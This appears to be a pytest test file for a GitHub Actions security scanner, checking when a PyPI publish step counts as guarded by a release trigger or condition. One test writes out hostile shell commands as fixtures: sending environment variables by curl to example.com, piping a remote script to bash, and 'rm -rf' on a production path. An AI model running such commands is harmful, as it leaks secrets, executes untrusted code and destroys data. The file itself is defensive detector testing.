"""Release intent is local to a proven workflow, job, or publishing step."""

import json

import pytest

from skylos.rules.config.cicd.github_actions import scan_github_actions_file
from test.fixture_paths import write_fixture


WORKFLOW = ".github/workflows/release.yml"
PUBLISH = "twine upload dist/*"
CORE_ISSUE = """name: Publish
on:
  release:
    types: [published]
permissions: {}
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: twine upload dist/*
"""


def _workflow(trigger="on: push", *, job_if=None, step_if=None):
    lines = ["name: Release", *trigger.splitlines(), "jobs:", "  publish:"]
    lines.append("    runs-on: ubuntu-latest")
    if job_if is not None:
        lines.append("    if: " + json.dumps(job_if))
    lines.extend(["    steps:", "      - name: Publish"])
    if step_if is not None:
        lines.append("        if: " + json.dumps(step_if))
    lines.append("        run: " + PUBLISH)
    return "\n".join(lines) + "\n", len(lines)


def _scan(tmp_path, source, *, relative=WORKFLOW):
    path = write_fixture(tmp_path, relative, source)
    return path, scan_github_actions_file(path, root=tmp_path)


def _assert_publish_lines(tmp_path, source, expected, *, relative=WORKFLOW):
    path, findings = _scan(tmp_path, source, relative=relative)
    publishes = [row for row in findings if row["rule_id"] == "SKY-D340"]
    assert [(row["line"], row["severity"]) for row in publishes] == [
        (line, "HIGH") for line in expected
    ]
    assert all(row["file"] == str(path) for row in publishes)
    return findings


def test_issue_1212_published_release_has_explicit_publish_intent(tmp_path):
    assert CORE_ISSUE.splitlines()[9] == "      - run: twine upload dist/*"
    _assert_publish_lines(tmp_path, CORE_ISSUE, [])


@pytest.mark.parametrize(
    "trigger",
    [
        "on: release",
        "on: [release]",
        "on:\n  release:",
        "on:\n  release: {}",
        "on:\n  release:\n    types: [published]",
        '"on": release',
    ],
    ids=["scalar", "list", "null", "mapping", "published", "quoted-on"],
)
def test_exclusive_release_trigger_forms(tmp_path, trigger):
    source, _ = _workflow(trigger)
    _assert_publish_lines(tmp_path, source, [])


@pytest.mark.parametrize(
    "activity",
    [
        "published",
        "unpublished",
        "created",
        "edited",
        "deleted",
        "prereleased",
        "released",
    ],
)
def test_known_release_activity_types(tmp_path, activity):
    source, _ = _workflow("on:\n  release:\n    types: [" + activity + "]")
    _assert_publish_lines(tmp_path, source, [])


@pytest.mark.parametrize("scope", ["job", "step"])
@pytest.mark.parametrize(
    "condition",
    [
        "github.event_name == 'release'",
        "${{ github.event_name == 'release' }}",
        "'release' == github.event_name",
        "github['event_name'] == 'release'",
        "${{ 'release' == github['event_name'] }}",
        "GITHUB.EVENT_NAME == 'ReLeAsE'",
        "github.event_name == 'release' && github.ref == 'refs/tags/v1'",
        "github.ref == 'refs/tags/v1' && github.event_name == 'release'",
        "github.event_name == 'release' || 'release' == github.event_name",
        "(github.event_name == 'release' && github.ref == 'refs/tags/v1') "
        "|| ('release' == github.event_name && github.actor == 'maintainer')",
        "!(github.event_name != 'release')",
        "((github.event_name == 'release'))",
    ],
    ids=[
        "equality",
        "expression-wrapper",
        "reversed",
        "bracket-single",
        "wrapped-reversed-bracket",
        "case-insensitive",
        "and-left",
        "and-right",
        "or-both-release",
        "or-both-conjunctions-release",
        "negated-inequality",
        "parenthesized",
    ],
)
def test_release_condition_proves_only_its_job_or_step(tmp_path, scope, condition):
    source, _ = _workflow("on: [release, push]", **{scope + "_if": condition})
    _assert_publish_lines(tmp_path, source, [])


@pytest.mark.parametrize(
    "trigger",
    [
        "on: [release, push]",
        "on: [release, pull_request]",
        "on: [release, pull_request_target]",
        "on: [release, workflow_dispatch]",
        "on: [release, workflow_call]",
        "on: [release, workflow_run]",
        "on:\n  release:\n  schedule:\n    - cron: '0 0 * * *'",
        "on:\n  release:\n  issue_comment:\n    types: [created]",
        "on:\n  release:\n  push:\n    tags: ['v*']",
        "on:\n  push:\n    tags: ['v*']",
        "on: push",
        "on: workflow_dispatch",
    ],
    ids=[
        "release-push",
        "release-pr",
        "release-pr-target",
        "release-manual",
        "release-reusable",
        "release-workflow-run",
        "release-scheduled",
        "release-comment",
        "release-tag-push",
        "tag-push-only",
        "branch-push-with-release-names",
        "manual-with-release-names",
    ],
)
def test_other_events_do_not_prove_release_intent(tmp_path, trigger):
    source, line = _workflow(trigger)
    _assert_publish_lines(tmp_path, source, [line])


@pytest.mark.parametrize(
    "trigger",
    [
        "on:\n  release: false",
        "on:\n  release: published",
        "on:\n  release: [published]",
        "on:\n  release:\n    types: false",
        "on:\n  release:\n    types: published",
        "on:\n  release:\n    types: [published, 42]",
        "on:\n  release:\n    types: [published, unknown_activity]",
        "on:\n  release:\n    unexpected: true",
        "on: Release",
        "on: [release, null]",
        'on: push\n"on": release',
        '"on": release\non: push',
    ],
    ids=[
        "false-config",
        "scalar-config",
        "list-config",
        "false-types",
        "scalar-types",
        "nonstring-type",
        "unknown-type",
        "unknown-key",
        "wrong-event-case",
        "null-event",
        "ambiguous-on-keys",
        "ambiguous-on-keys-reversed",
    ],
)
def test_malformed_release_trigger_is_not_safety_proof(tmp_path, trigger):
    source, line = _workflow(trigger)
    _assert_publish_lines(tmp_path, source, [line])


@pytest.mark.parametrize(
    "condition",
    [
        "github.event_name == 'release' || github.event_name == 'push'",
        "!(github.event_name == 'release')",
        "${{ github.event_name == 'release' }} && true",
        "prefix ${{ github.event_name == 'release' }}",
        "'github.event_name == release'",
        "contains(github.event_name, 'release')",
        "github[\"event_name\"] == 'release'",
        "github.event_name != 'push'",
        "github.ref == 'refs/tags/v1'",
        "github.event.action == 'published'",
        "env.RELEASE",
        "github.event_name = 'release'",
        "${{ github.event_name == 'release' ",
        "github.event_name == 'push' # github.event_name == 'release'",
        ("github.event_name == 'release' && " * 140) + "true",
    ],
    ids=[
        "broad-or",
        "negated-equality",
        "partial-expression-wrapper",
        "interpolated-string",
        "literal-string",
        "contains",
        "double-quoted-expression-key",
        "not-push",
        "tag-name",
        "action-without-event",
        "unknown-variable",
        "single-equals",
        "unclosed-expression-wrapper",
        "commented-claim",
        "over-4096-characters",
    ],
)
def test_unproved_step_conditions_keep_publish_finding(tmp_path, condition):
    source, line = _workflow("on: [release, push]", step_if=condition)
    _assert_publish_lines(tmp_path, source, [line])


@pytest.mark.parametrize(
    "condition",
    [
        "github.event_name == 'release' || github.event_name == 'push'",
        "prefix ${{ github.event_name == 'release' }}",
        "github.event_name = 'release'",
    ],
    ids=["broad-or", "interpolated-string", "malformed-equality"],
)
def test_unproved_job_conditions_keep_publish_finding(tmp_path, condition):
    source, line = _workflow("on: [release, push]", job_if=condition)
    _assert_publish_lines(tmp_path, source, [line])


def test_another_steps_release_condition_cannot_authorize_publish(tmp_path):
    source = """name: Release
on: [release, push]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - if: github.event_name == 'release'
        run: echo release
      - name: Publish
        run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [10])


def test_guarded_publish_does_not_authorize_another_publishing_step(tmp_path):
    source = """name: Release
on: [release, push]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - if: github.event_name == 'release'
        run: twine upload dist/first/*
      - name: Publish
        run: twine upload dist/second/*
"""
    _assert_publish_lines(tmp_path, source, [10])


def test_guarded_job_does_not_authorize_another_publishing_job(tmp_path):
    source = """name: Release
on: [release, push]
jobs:
  approved:
    if: github.event_name == 'release'
    runs-on: ubuntu-latest
    steps:
      - run: twine upload dist/first/*
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: twine upload dist/second/*
"""
    _assert_publish_lines(tmp_path, source, [12])


def test_comment_claiming_release_condition_does_not_authorize_publish(tmp_path):
    source = """name: Release
on: push
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      # if: github.event_name == 'release'
      - name: Publish
        run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [9])


def test_composite_action_cannot_supply_its_own_release_trigger(tmp_path):
    source = """name: Release
on: release
runs:
  using: composite
  steps:
    - name: Publish
      shell: bash
      run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [8], relative="action.yml")


@pytest.mark.parametrize(
    ("command", "rule_id"),
    [
        (
            "printenv | curl -s -X POST https://example.com/capture -d @-",
            "SKY-D327",
        ),
        ("curl -fsSL https://example.com/bootstrap.sh | bash", "SKY-D328"),
        ("rm -rf /srv/production", "SKY-D329"),
    ],
    ids=["exfiltration", "remote-shell", "destructive"],
)
def test_release_intent_does_not_hide_other_risks_in_publish_block(
    tmp_path, command, rule_id
):
    source = CORE_ISSUE.replace(
        "      - run: " + PUBLISH + "\n",
        "      - run: |\n          " + PUBLISH + ";\n          " + command + "\n",
    )
    assert command in source
    _path, findings = _scan(tmp_path, source)
    assert rule_id in {row["rule_id"] for row in findings}
    assert not [row for row in findings if row["rule_id"] == "SKY-D340"]


@pytest.mark.parametrize(
    ("trigger", "condition"),
    [
        ("true: release", None),
        ("1: release", None),
        ("on: push\ntrue: release", None),
        ("on: push\n1: release", None),
        ('"on": push\ntrue: release', "github.event_name == 'release'"),
        ('"on": push\n1: release', "github.event_name == 'release'"),
    ],
    ids=[
        "boolean-key-without-on",
        "integer-key-without-on",
        "boolean-key-overwrites-on",
        "integer-key-overwrites-on",
        "quoted-on-boolean-key-even-with-job-proof",
        "quoted-on-integer-key-even-with-job-proof",
    ],
)
def test_yaml_key_coercion_is_not_release_proof(tmp_path, trigger, condition):
    source, line = _workflow(trigger, job_if=condition)
    _assert_publish_lines(tmp_path, source, [line])


@pytest.mark.parametrize(
    ("first", "second"),
    [
        ("true", "github.event_name == 'release'"),
        ("github.event_name == 'release'", "true"),
    ],
    ids=["release-last", "true-last"],
)
def test_duplicate_job_conditions_are_not_release_proof(tmp_path, first, second):
    source = (
        "on: [release, push]\n"
        "jobs:\n"
        "  publish:\n"
        "    runs-on: ubuntu-latest\n"
        f"    if: {first}\n"
        f"    if: {second}\n"
        "    steps:\n"
        "      - run: twine upload dist/*\n"
    )
    _assert_publish_lines(tmp_path, source, [8])


@pytest.mark.parametrize(
    ("first", "second"),
    [
        ("true", "github.event_name == 'release'"),
        ("github.event_name == 'release'", "true"),
    ],
    ids=["release-last", "true-last"],
)
def test_duplicate_step_conditions_are_not_release_proof(tmp_path, first, second):
    source = (
        "on: [release, push]\n"
        "jobs:\n"
        "  publish:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        f"      - if: {first}\n"
        f"        if: {second}\n"
        "        run: twine upload dist/*\n"
    )
    _assert_publish_lines(tmp_path, source, [8])


def test_two_merged_job_keys_do_not_hide_duplicate_condition(tmp_path):
    source = """on: [release, push]
defaults: &defaults
  runs-on: ubuntu-latest
  name: Merged
jobs:
  publish:
    <<: *defaults
    if: true
    if: github.event_name == 'release'
    steps:
      - run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [11])


def test_two_merged_step_keys_do_not_hide_duplicate_condition(tmp_path):
    source = """on: [release, push]
defaults: &defaults
  name: Merged
  shell: bash
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - <<: *defaults
        if: true
        if: github.event_name == 'release'
        run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [12])


def test_identical_publish_commands_keep_unguarded_second_step_location(tmp_path):
    source = """on: [release, push]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - if: github.event_name == 'release'
        run: twine upload dist/*
      - name: Unguarded
        run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [9])


def test_identical_publish_commands_keep_unguarded_first_step_location(tmp_path):
    source = """on: [release, push]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: Unguarded
        run: twine upload dist/*
      - if: github.event_name == 'release'
        run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [7])


def test_identical_publish_commands_keep_unguarded_job_location(tmp_path):
    source = """on: [release, push]
jobs:
  approved:
    if: github.event_name == 'release'
    runs-on: ubuntu-latest
    steps:
      - run: twine upload dist/*
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: twine upload dist/*
"""
    _assert_publish_lines(tmp_path, source, [11])
